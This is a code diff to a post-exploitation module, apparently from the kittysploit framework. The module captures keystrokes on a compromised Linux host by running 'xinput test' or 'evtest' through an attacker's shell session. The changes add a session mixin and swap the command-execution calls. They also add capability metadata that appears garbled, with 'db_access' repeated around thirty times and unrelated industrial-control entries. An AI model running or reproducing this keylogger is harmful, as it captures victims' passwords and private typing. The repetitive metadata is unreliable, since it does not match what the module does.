@@ -12,9 +12,10 @@ import time
 
 from kittysploit import *
 from lib.post.linux.system import System
+from lib.post.linux.session import LinuxSessionMixin
 
 
-class Module(Post, System):
+class Module(Post, System, LinuxSessionMixin):
     __info__ = {
         "name": "Linux Keyboard Event Capture",
         "description": (
@@ -38,6 +39,56 @@ class Module(Post, System):
         'reversible': False,
         'approval_required': True,
         'produces': ['risk_signals'],
+        'cost': 1.5,
+        'noise': 0.5,
+        'value': 1.0,
+        'requires':         {'min_endpoints': 0,
+         'min_params': 0,
+         'tech_hints_any': [],
+         'tech_hints_all': [],
+         'specializations_any': [],
+         'risk_signals_any': [],
+         'auth_session': False,
+         'capabilities_any': [],
+         'capabilities_all': [],
+         'confidence_min': {},
+         'confidence_min_any': {},
+         'endpoint_pattern_any': [],
+         'param_any': [],
+         'api_surface_ready': False},
+        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 's7comm', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''}],
+         'consumes_capabilities': ['shell'],
+         'option_bindings': {},
+         'suggested_followups': []},
     },
     }
 
@@ -85,6 +136,10 @@ class Module(Post, System):
         return True
 
     def run(self):
+
+        if not self.linux_require_linux():
+            return False
+
         dur = int(self.duration) if self.duration else 15
         if dur < 1:
             dur = 1
@@ -144,7 +199,7 @@ class Module(Post, System):
             return False
 
         disp = self._display_val()
-        listing = self.cmd_exec(f"DISPLAY={disp} xinput list 2>&1")
+        listing = self.linux_execute(f"DISPLAY={disp} xinput list 2>&1")
         if not listing or "unable to open" in listing.lower() or "cannot open" in listing.lower():
             print_error(f"Cannot use DISPLAY={disp} (no X server or permission)")
             print_info(listing.strip() if listing else "(no output)")
@@ -163,7 +218,7 @@ class Module(Post, System):
         inner = f'env DISPLAY={disp} xinput test {kid} 2>&1'
         cmd = self._wrap_timeout(dur, inner)
         print_status(f"Recording X11 key events for ~{dur}s (user must type in that session)...")
-        captured = self.cmd_exec(cmd)
+        captured = self.linux_execute(cmd)
         if not captured or not captured.strip():
             print_warning("No xinput output (wrong device id, no keypresses, or desktop idle)")
             return False
@@ -221,7 +276,7 @@ class Module(Post, System):
         inner = f"evtest {dev} 2>&1"
         cmd = self._wrap_timeout(dur, inner)
         print_status(f"Recording evtest from {dev} for ~{dur}s...")
-        captured = self.cmd_exec(cmd)
+        captured = self.linux_execute(cmd)
         if not captured:
             print_error("No evtest output (permission denied on /dev/input or device missing)")
             return False
